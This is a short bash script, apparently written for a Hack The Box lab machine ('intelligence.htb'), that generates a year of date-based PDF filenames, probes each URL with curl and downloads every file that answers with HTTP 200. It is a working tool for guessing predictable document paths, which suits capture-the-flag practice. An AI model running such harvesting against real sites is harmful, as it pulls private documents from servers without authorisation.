#!/bin/bash

d=2020-01-01

tput setaf 3; echo "[*] Creating PDF Files Format ..."
while [ "$d" != 2020-12-16  ];do
    echo $d
    d=$(date -I -d "$d + 1 day")

done > pdf.txt

sed -e 's/$/-upload.pdf/' -i pdf.txt 

tput setaf 6; echo "[+] Operation Is Completed Successfully! File Is Saved Inside Your Current Directory As 'pdf.txt'"
tput sgr0

perl -pe 's#^#intelligence.htb/documents/#' pdf.txt > urls.txt


tput setaf 3; echo "[*] Looking for valid PDF files inside { intelligence.htb }..."
tput sgr0


if [ ! -d "PDFs" ]; then
        mkdir ./PDFs
fi

for protocol in 'http://' 'https://' ;do
        while read line;
        do
                code=$(curl -L --write-out "%{http_code}\n" --output /dev/null --silent --insecure "$protocol$line")
        if [ $code -ne 200 ]; then
                tput setaf 1; echo "[-] $protocol$line: Not Responding...."

        else
                tput setaf 3; echo "[*] $protocol$line: HTTP $code"
                tput setaf 6; echo "[+] Downloading $protocol$line to 'PDFs' Directory..."
                wget --quiet -P ./PDFs $protocol$line
                tput sgr0
        fi
        done < urls.txt
done
